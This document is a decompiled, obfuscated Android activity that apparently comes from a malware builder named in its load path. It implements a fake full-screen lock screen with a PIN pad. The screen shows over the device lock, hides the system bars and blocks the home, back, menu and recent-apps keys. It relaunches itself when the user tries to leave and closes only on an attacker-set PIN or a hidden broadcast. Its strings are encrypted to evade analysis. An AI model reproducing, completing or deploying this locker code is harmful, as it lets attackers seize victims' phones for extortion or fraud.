package app.mobilex.plus;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.view.KeyEvent;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import app.mobilex.plus.UtilGLWorker;
import app.mobilex.plus.util.TypefaceCache;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.NoSuchElementException;
import v.s.Aqh0grSwgDbwr;
import v.s.CD9rSO10bA49Vqb;
import v.s.YqOiSVb2wSv9Lq63qb;
import v.s.okc5AGRjqrud84oM6d;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class UtilGLWorker extends Activity {
    public static volatile UtilGLWorker H9XlUr4OeMJFiXK;
    public static volatile boolean MLSIo1htfMPWeB8V876L;
    public static volatile boolean XiR1pIn5878vVWd;
    public TextView D5P1xCAyuvgF;
    public TextView b1EoSIRjJHO5;
    public LinearLayout ibVTtJUNfrGYbW;
    public TextView pyu8ovAipBTLYAiKab;
    public boolean w9sT1Swbhx3hs;
    public static final String gIIiyi2ddlMDR0 = TypefaceCache.obtain("003600780057008800F300B400ED00A4002C0072005E");
    public static final String wotphlvK9sPbXJ = TypefaceCache.obtain("003300730049009400F900AC00C600A2002D0062");
    public static final String Qrz92kRPw4GcghAc = TypefaceCache.obtain("002F00790058008C00CF00AB00DB00B3002F0073");
    public static final String nQilHWaqS401ZtR = TypefaceCache.obtain("002F00790058008C00CF00B200D700B400300077005C0082");
    public static final String J0zjQ7CAgohuxU20eCW6 = TypefaceCache.obtain("00200079005600C900F100AF00C200E90007005F006800AA00D9008C00E10098000F0059007800AC");
    public String dDIMxZXP1V8HdM = "1234";
    public String vekpFI4d1Nc4fakF = "";
    public String JXn4Qf7zpnLjP5 = "";
    public final Handler Ee8d2j4S9Vm5yGuR = new Handler(Looper.getMainLooper());
    public final ArrayList xDyLpEZyrcKVe0 = new ArrayList();
    public final UtilGLWorker$dismissReceiver$1 hjneShqpF9Tis4 = new BroadcastReceiver() { // from class: app.mobilex.plus.UtilGLWorker$dismissReceiver$1
        private static /* synthetic */ void pooqnh() {
        }

        @Override // android.content.BroadcastReceiver
        public final void onReceive(Context context, Intent intent) {
            String str = UtilGLWorker.gIIiyi2ddlMDR0;
            UtilGLWorker.MLSIo1htfMPWeB8V876L = false;
            try {
                try {
                    this.dDIMxZXP1V8HdM.finishAndRemoveTask();
                } catch (Exception unused) {
                }
            } catch (Exception unused2) {
                this.dDIMxZXP1V8HdM.finish();
            }
        }
    };
    public final YqOiSVb2wSv9Lq63qb gmNWMfvn6zlEj = new YqOiSVb2wSv9Lq63qb(9, this);

    public static LinearLayout.LayoutParams Ee8d2j4S9Vm5yGuR() {
        return new LinearLayout.LayoutParams((-84) + 83, -2);
    }

    public final void JXn4Qf7zpnLjP5() {
        LinearLayout linearLayout = this.ibVTtJUNfrGYbW;
        if (linearLayout == null) {
            linearLayout = null;
        }
        linearLayout.removeAllViews();
        int iMax = Math.max(this.dDIMxZXP1V8HdM.length(), 4);
        for (int i = 0; i < iMax; i++) {
            View view = new View(this);
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setShape(1);
            if (i < this.xDyLpEZyrcKVe0.size()) {
                gradientDrawable.setColor(-1);
            } else {
                gradientDrawable.setColor(0);
                gradientDrawable.setStroke(vekpFI4d1Nc4fakF(2), Color.parseColor(TypefaceCache.obtain("00600025007A00D200A000E9008A")));
            }
            view.setBackground(gradientDrawable);
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(vekpFI4d1Nc4fakF(13), vekpFI4d1Nc4fakF(13));
            layoutParams.setMargins(vekpFI4d1Nc4fakF(9), 0, vekpFI4d1Nc4fakF(9), 0);
            LinearLayout linearLayout2 = this.ibVTtJUNfrGYbW;
            if (linearLayout2 == null) {
                linearLayout2 = null;
            }
            linearLayout2.addView(view, layoutParams);
        }
    }

    public final void dDIMxZXP1V8HdM() {
        try {
            Intent intent = new Intent(this, (Class<?>) UtilGLWorker.class);
            intent.putExtra(gIIiyi2ddlMDR0, this.dDIMxZXP1V8HdM);
            intent.putExtra(wotphlvK9sPbXJ, true);
            if (this.vekpFI4d1Nc4fakF.length() > 0) {
                intent.putExtra(Qrz92kRPw4GcghAc, this.vekpFI4d1Nc4fakF);
            }
            if (this.JXn4Qf7zpnLjP5.length() > 0) {
                intent.putExtra(nQilHWaqS401ZtR, this.JXn4Qf7zpnLjP5);
            }
            intent.addFlags(805502976);
            startActivity(intent);
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final boolean dispatchKeyEvent(KeyEvent keyEvent) {
        if (keyEvent == null) {
            return super.dispatchKeyEvent(keyEvent);
        }
        if (Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(Integer.valueOf((-20) + 23), 4, 82, 187).contains(Integer.valueOf(keyEvent.getKeyCode()))) {
            return true;
        }
        return super.dispatchKeyEvent(keyEvent);
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        H9XlUr4OeMJFiXK = this;
        String stringExtra = getIntent().getStringExtra(gIIiyi2ddlMDR0);
        if (stringExtra == null) {
            stringExtra = "1234";
        }
        this.dDIMxZXP1V8HdM = stringExtra;
        int i = 1;
        this.w9sT1Swbhx3hs = getIntent().getBooleanExtra(wotphlvK9sPbXJ, true);
        String stringExtra2 = getIntent().getStringExtra(Qrz92kRPw4GcghAc);
        if (stringExtra2 == null) {
            stringExtra2 = "";
        }
        this.vekpFI4d1Nc4fakF = stringExtra2;
        String stringExtra3 = getIntent().getStringExtra(nQilHWaqS401ZtR);
        if (stringExtra3 == null) {
            stringExtra3 = "";
        }
        this.JXn4Qf7zpnLjP5 = stringExtra3;
        MLSIo1htfMPWeB8V876L = true;
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 125 - 92) {
            registerReceiver(this.hjneShqpF9Tis4, new IntentFilter(J0zjQ7CAgohuxU20eCW6), 4);
        } else {
            registerReceiver(this.hjneShqpF9Tis4, new IntentFilter(J0zjQ7CAgohuxU20eCW6));
        }
        if (i2 >= 108 - 81) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        }
        getWindow().addFlags(6816896);
        if (i2 >= 28) {
            getWindow().getAttributes().layoutInDisplayCutoutMode = (-84) + 85;
        }
        getWindow().getDecorView().setSystemUiVisibility(4102);
        getWindow().setStatusBarColor(0);
        getWindow().setNavigationBarColor(0);
        Drawable gradientDrawable = new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, new int[]{Color.parseColor(TypefaceCache.obtain("00600026007D00D600A900ED0081")), Color.parseColor(TypefaceCache.obtain("00600027007A00D500A700EC0081"))});
        FrameLayout frameLayout = new FrameLayout(this);
        frameLayout.setBackground(gradientDrawable);
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        TextView textView = new TextView(this);
        textView.setText(new SimpleDateFormat(TypefaceCache.obtain("000B005E0001008A00FD"), Locale.getDefault()).format(new Date()));
        textView.setTextSize(2, 72.0f);
        textView.setTextColor(-1);
        int i3 = (-56) + 73;
        textView.setGravity(i3);
        textView.setTypeface(Typeface.create(TypefaceCache.obtain("003000770055009400BD00AC00D700B5002A00700016009300F800B600DC"), 0));
        textView.setLetterSpacing(0.08f);
        textView.setIncludeFontPadding(false);
        this.pyu8ovAipBTLYAiKab = textView;
        LinearLayout.LayoutParams layoutParamsEe8d2j4S9Vm5yGuR = Ee8d2j4S9Vm5yGuR();
        layoutParamsEe8d2j4S9Vm5yGuR.topMargin = vekpFI4d1Nc4fakF(48);
        linearLayout.addView(textView, layoutParamsEe8d2j4S9Vm5yGuR);
        TextView textView2 = new TextView(this);
        textView2.setText(new SimpleDateFormat(TypefaceCache.obtain("00060053007E00A200BC00FF00D600E7000E005B007600AA"), Locale.getDefault()).format(new Date()));
        textView2.setTextSize(2, 15.0f);
        textView2.setTextColor(Color.parseColor(TypefaceCache.obtain("00600021007A00DF00D6009E0082")));
        textView2.setGravity(i3);
        textView2.setTypeface(Typeface.create(TypefaceCache.obtain("003000770055009400BD00AC00D700B5002A00700016008B00F900B800DA00B3"), 0));
        this.D5P1xCAyuvgF = textView2;
        LinearLayout.LayoutParams layoutParamsEe8d2j4S9Vm5yGuR2 = Ee8d2j4S9Vm5yGuR();
        layoutParamsEe8d2j4S9Vm5yGuR2.topMargin = vekpFI4d1Nc4fakF(2);
        layoutParamsEe8d2j4S9Vm5yGuR2.bottomMargin = vekpFI4d1Nc4fakF(28);
        linearLayout.addView(textView2, layoutParamsEe8d2j4S9Vm5yGuR2);
        if (this.vekpFI4d1Nc4fakF.length() > 0) {
            TextView textView3 = new TextView(this);
            textView3.setText(this.vekpFI4d1Nc4fakF);
            textView3.setTextSize(2, 16.0f);
            textView3.setTextColor(-1);
            textView3.setGravity(i3);
            textView3.setTypeface(null, 1);
            LinearLayout.LayoutParams layoutParamsEe8d2j4S9Vm5yGuR3 = Ee8d2j4S9Vm5yGuR();
            layoutParamsEe8d2j4S9Vm5yGuR3.bottomMargin = vekpFI4d1Nc4fakF(4);
            linearLayout.addView(textView3, layoutParamsEe8d2j4S9Vm5yGuR3);
        }
        if (this.JXn4Qf7zpnLjP5.length() > 0) {
            TextView textView4 = new TextView(this);
            textView4.setText(this.JXn4Qf7zpnLjP5);
            textView4.setTextSize(2, 13.0f);
            textView4.setTextColor(Color.parseColor(TypefaceCache.obtain("00600021007A00DF00D6009E0082")));
            textView4.setGravity(i3);
            textView4.setPadding(vekpFI4d1Nc4fakF(32), 0, vekpFI4d1Nc4fakF(32), 0);
            LinearLayout.LayoutParams layoutParamsEe8d2j4S9Vm5yGuR4 = Ee8d2j4S9Vm5yGuR();
            layoutParamsEe8d2j4S9Vm5yGuR4.bottomMargin = vekpFI4d1Nc4fakF(16);
            linearLayout.addView(textView4, layoutParamsEe8d2j4S9Vm5yGuR4);
        }
        if (this.vekpFI4d1Nc4fakF.length() == 0 && this.JXn4Qf7zpnLjP5.length() == 0) {
            TextView textView5 = new TextView(this);
            textView5.setText(TypefaceCache.checked("04510424040E04D304A8049D048700E70013005F007500CA04AA04E10486"));
            textView5.setTextSize(2, 15.0f);
            textView5.setTextColor(Color.parseColor(TypefaceCache.obtain("0060002F000C00A600D1009D00F0")));
            textView5.setGravity(i3);
            LinearLayout.LayoutParams layoutParamsEe8d2j4S9Vm5yGuR5 = Ee8d2j4S9Vm5yGuR();
            layoutParamsEe8d2j4S9Vm5yGuR5.bottomMargin = vekpFI4d1Nc4fakF(16);
            linearLayout.addView(textView5, layoutParamsEe8d2j4S9Vm5yGuR5);
        }
        LinearLayout linearLayout2 = new LinearLayout(this);
        linearLayout2.setOrientation(0);
        linearLayout2.setGravity(i3);
        this.ibVTtJUNfrGYbW = linearLayout2;
        JXn4Qf7zpnLjP5();
        View view = this.ibVTtJUNfrGYbW;
        if (view == null) {
            view = null;
        }
        LinearLayout.LayoutParams layoutParamsEe8d2j4S9Vm5yGuR6 = Ee8d2j4S9Vm5yGuR();
        layoutParamsEe8d2j4S9Vm5yGuR6.bottomMargin = vekpFI4d1Nc4fakF(4);
        linearLayout.addView(view, layoutParamsEe8d2j4S9Vm5yGuR6);
        TextView textView6 = new TextView(this);
        textView6.setText("");
        textView6.setTextSize(2, 12.0f);
        textView6.setTextColor(Color.parseColor(TypefaceCache.obtain("00600050007D00D200A200EA0080")));
        textView6.setGravity(i3);
        textView6.setMinHeight(vekpFI4d1Nc4fakF(22));
        this.b1EoSIRjJHO5 = textView6;
        LinearLayout.LayoutParams layoutParamsEe8d2j4S9Vm5yGuR7 = Ee8d2j4S9Vm5yGuR();
        layoutParamsEe8d2j4S9Vm5yGuR7.bottomMargin = vekpFI4d1Nc4fakF(97 - 85);
        linearLayout.addView(textView6, layoutParamsEe8d2j4S9Vm5yGuR7);
        GridLayout gridLayout = new GridLayout(this);
        gridLayout.setColumnCount(3);
        gridLayout.setRowCount(4);
        gridLayout.setUseDefaultMargins(false);
        int iVekpFI4d1Nc4fakF = vekpFI4d1Nc4fakF(68);
        int iVekpFI4d1Nc4fakF2 = vekpFI4d1Nc4fakF(8);
        for (final String str : Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4("1", "2", "3", "4", "5", "6", "7", "8", "9", "⌫", "0", "✓")) {
            FrameLayout frameLayout2 = new FrameLayout(this);
            final View view2 = new View(this);
            GradientDrawable gradientDrawable2 = new GradientDrawable();
            gradientDrawable2.setShape(i);
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, "✓")) {
                gradientDrawable2.setColor(Color.parseColor(TypefaceCache.obtain("00600024007E00D000D400EC0080")));
            } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, "⌫")) {
                gradientDrawable2.setColor(Color.parseColor(TypefaceCache.obtain("00600024000D00D400A200EC008A")));
            } else {
                gradientDrawable2.setColor(Color.parseColor(TypefaceCache.obtain("00600027007800D400A100EB008A")));
            }
            view2.setBackground(gradientDrawable2);
            frameLayout2.addView(view2, new FrameLayout.LayoutParams(iVekpFI4d1Nc4fakF, iVekpFI4d1Nc4fakF));
            TextView textView7 = new TextView(this);
            textView7.setText(str);
            textView7.setTextSize(2, okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, "⌫") ? 20.0f : okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, "✓") ? 22.0f : 26.0f);
            textView7.setTextColor(-1);
            textView7.setGravity(17);
            if (str.length() == 0) {
                throw new NoSuchElementException("Char sequence is empty.");
            }
            Character.isDigit(str.charAt(0));
            textView7.setTypeface(null, 0);
            frameLayout2.addView(textView7, new FrameLayout.LayoutParams(iVekpFI4d1Nc4fakF, iVekpFI4d1Nc4fakF));
            frameLayout2.setClickable(true);
            frameLayout2.setFocusable(true);
            frameLayout2.setOnClickListener(new View.OnClickListener() { // from class: v.s.z3mluXnqqhegbSldFY
                private static /* synthetic */ void tagxjypnwv() {
                }

                @Override // android.view.View.OnClickListener
                public final void onClick(View view3) {
                    String str2 = UtilGLWorker.gIIiyi2ddlMDR0;
                    View view4 = view2;
                    view4.animate().scaleX(0.85f).scaleY(0.85f).setDuration(60L).withEndAction(new mSyFfcAAyjxLnl2Ul6(view4, 0)).start();
                    UtilGLWorker utilGLWorker = this;
                    ArrayList arrayList = utilGLWorker.xDyLpEZyrcKVe0;
                    TextView textView8 = utilGLWorker.b1EoSIRjJHO5;
                    if (textView8 == null) {
                        textView8 = null;
                    }
                    textView8.setText("");
                    String str3 = str;
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str3, "⌫")) {
                        if (arrayList.isEmpty()) {
                            return;
                        }
                        arrayList.remove(arrayList.size() - 1);
                        utilGLWorker.JXn4Qf7zpnLjP5();
                        return;
                    }
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str3, "✓")) {
                        utilGLWorker.w9sT1Swbhx3hs();
                        return;
                    }
                    if (arrayList.size() < 8) {
                        arrayList.add(Character.valueOf(str3.charAt(0)));
                        utilGLWorker.JXn4Qf7zpnLjP5();
                        if (arrayList.size() == utilGLWorker.dDIMxZXP1V8HdM.length()) {
                            utilGLWorker.Ee8d2j4S9Vm5yGuR.postDelayed(new CD9rSO10bA49Vqb(utilGLWorker, 1), 200L);
                        }
                    }
                }
            });
            GridLayout.LayoutParams layoutParams = new GridLayout.LayoutParams();
            layoutParams.width = iVekpFI4d1Nc4fakF;
            layoutParams.height = iVekpFI4d1Nc4fakF;
            layoutParams.setMargins(iVekpFI4d1Nc4fakF2, iVekpFI4d1Nc4fakF2, iVekpFI4d1Nc4fakF2, iVekpFI4d1Nc4fakF2);
            gridLayout.addView(frameLayout2, layoutParams);
            int i4 = (-66) + 83;
            i = 88 - 87;
        }
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams2.gravity = (-70) + 71;
        linearLayout.addView(gridLayout, layoutParams2);
        frameLayout.addView(linearLayout, new FrameLayout.LayoutParams(-1, -2, 17));
        setContentView(frameLayout);
        this.Ee8d2j4S9Vm5yGuR.post(this.gmNWMfvn6zlEj);
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
        this.Ee8d2j4S9Vm5yGuR.removeCallbacks(this.gmNWMfvn6zlEj);
        try {
            unregisterReceiver(this.hjneShqpF9Tis4);
        } catch (Exception unused) {
        }
        while (Runtime.getRuntime().maxMemory() < 0) {
            Runtime.getRuntime().totalMemory();
        }
        if (H9XlUr4OeMJFiXK == this) {
            H9XlUr4OeMJFiXK = null;
        }
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public final boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (i == 63 - 60 || i == 4 || i == 82 || i == 187) {
            return true;
        }
        return super.onKeyDown(i, keyEvent);
    }

    @Override // android.app.Activity
    public final void onPause() {
        super.onPause();
        XiR1pIn5878vVWd = false;
        if (this.w9sT1Swbhx3hs && MLSIo1htfMPWeB8V876L) {
            this.Ee8d2j4S9Vm5yGuR.postDelayed(new CD9rSO10bA49Vqb(this, 0), 300L);
        }
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        XiR1pIn5878vVWd = true;
    }

    @Override // android.app.Activity
    public final void onStop() {
        super.onStop();
        if (this.w9sT1Swbhx3hs && MLSIo1htfMPWeB8V876L) {
            dDIMxZXP1V8HdM();
        }
    }

    @Override // android.app.Activity
    public final void onUserLeaveHint() {
        super.onUserLeaveHint();
        if (this.w9sT1Swbhx3hs && MLSIo1htfMPWeB8V876L) {
            dDIMxZXP1V8HdM();
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z) {
        super.onWindowFocusChanged(z);
        if (z) {
            getWindow().getDecorView().setSystemUiVisibility(4102);
        }
    }

    public final int vekpFI4d1Nc4fakF(int i) {
        return (int) (i * getResources().getDisplayMetrics().density);
    }

    public final void w9sT1Swbhx3hs() {
        ArrayList arrayList = this.xDyLpEZyrcKVe0;
        char[] cArr = new char[arrayList.size()];
        int size = arrayList.size();
        int i = 0;
        int i2 = 0;
        while (i2 < size) {
            Object obj = arrayList.get(i2);
            i2++;
            cArr[i] = ((Character) obj).charValue();
            i++;
        }
        if (new String(cArr).equals(this.dDIMxZXP1V8HdM)) {
            this.Ee8d2j4S9Vm5yGuR.removeCallbacks(this.gmNWMfvn6zlEj);
            MLSIo1htfMPWeB8V876L = false;
            finish();
            return;
        }
        try {
            Object systemService = getSystemService("vibrator");
            Vibrator vibrator = systemService instanceof Vibrator ? (Vibrator) systemService : null;
            if (vibrator != null) {
                vibrator.vibrate(250L);
            }
        } catch (Exception unused) {
        }
        TextView textView = this.b1EoSIRjJHO5;
        if (textView == null) {
            textView = null;
        }
        textView.setText(TypefaceCache.checked("045E0423040904D204D004E204F904FE00630046007200A900BD04E5048C04F3"));
        this.xDyLpEZyrcKVe0.clear();
        JXn4Qf7zpnLjP5();
        LinearLayout linearLayout = this.ibVTtJUNfrGYbW;
        (linearLayout != null ? linearLayout : null).animate().translationX(vekpFI4d1Nc4fakF(15)).setDuration(40L).withEndAction(new CD9rSO10bA49Vqb(this, 2)).start();
    }
}
